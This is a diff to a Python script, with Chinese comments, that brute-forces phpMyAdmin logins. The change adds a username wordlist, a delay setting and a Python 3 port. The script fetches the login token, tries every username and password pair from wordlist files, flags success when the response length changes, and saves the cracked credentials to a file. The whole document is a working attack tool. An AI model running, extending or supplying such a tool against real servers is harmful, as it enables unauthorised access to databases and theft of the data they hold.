@@ -1,31 +1,38 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # @Author: CoolCat
+# @Modified: TARI 增加用户名字典，整理一下自己写代码的习惯
 # 脚本功能：暴力破解phpMyadmin密码
 
-import requests
 import re
 import time
+import requests
+
+# 延时爆破
+timeDelay = 0
+
+# 初次访问为 0
 n = 0
-Content_Length = 0
-url = raw_input("URL:")
-url = url.replace("\n", "")
-url = url.replace("\r", "")
-url = url.replace("index.php", "")
+contentLengthRaw = 0
+
+url = input("URL:")
+url = url.replace("\n", "").replace("\r", "").replace("index.php", "")
+
 res = requests.get(url, timeout=2)
 token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)
 token = str(token)
 token = token.replace("[u\'", "")
 token = token.replace("\']", "")
 print("[!]Token:" + token)
-try:
+
+for uname in open("username.txt"):
+    uname = uname.replace("\r", "").replace("\n", "") 
     for pwd in open("password.txt"):
-        pwd = pwd.replace("\r", "")
-        pwd = pwd.replace("\n", "")
-        if (res.status_code == 200):
+        pwd = pwd.replace("\r", "").replace("\n", "")
+        if res.status_code == 200:
             try:
                 session = requests.session()
-                fucker = {'pma_username': 'root',
+                fucker = {'pma_username': uname,
                           'pma_password': pwd,
                           "server": "1",
                           "target": "url.php",
@@ -33,28 +40,23 @@ try:
                 session.post(url, data=fucker)
                 url2 = url + '/index.php?target=url.php&token=' + token
                 r = session.get(url=url2, timeout=2)
-                if (n == 0):
-                    Content_Lengthraw = len(r.text)
-                    print("[-]初始返回头长度设定为:" + str(len(r.text)) + "\n")
-                print "[?]正在验证密码:" + str(pwd)
-                Content_Length = len(r.text)
-                if (Content_Length == Content_Lengthraw):
-                    print("[-]返回头长度为:" + str(Content_Lengthraw) + " 密码错误！")
-                else:
-                    print("[+]返回头长度为:" + str(Content_Length) + " 密码正确！")
-                    coolcat = open("success.txt", "a")
-                    coolcat.write(url + "的root密码为:" + str(pwd) + "\n")
-                    coolcat.close()
-                    exit()
-                n = n + 1
             except:
-                print("[!]未知错误")
+                print("[!] 在验证账号:" + str(uname) + "密码:" + str(pwd) + " 时发生未知错误")
+            # 第一次访问, 设置初始 http 返回头长度
+            if n == 0:
+                contentLengthRaw = len(r.text)
+                print("[-]初始返回头长度设定为:" + str(len(r.text)) + "\n")
+                n = n + 1
+            contentLength = len(r.text)
+            print("[?]正在验证账号:" + str(uname) + " 密码:" + str(pwd))
+            if contentLength == contentLengthRaw:
+                print("[-]返回头长度为:" + str(contentLength) + " 密码错误！")
+            else:
+                print("[+]返回头长度为:" + str(contentLength) + " 密码正确！")
+                coolcat = open("success.txt", "a")
+                coolcat.write(url + "的" + str(uname) + "密码为:" + str(pwd) + "\n")
+                coolcat.close()
+                exit()
         else:
             print(r.text)
-        time.sleep(0)
-except:
-    print("[!]未知错误")
-
-
-
-
+        time.sleep(timeDelay)
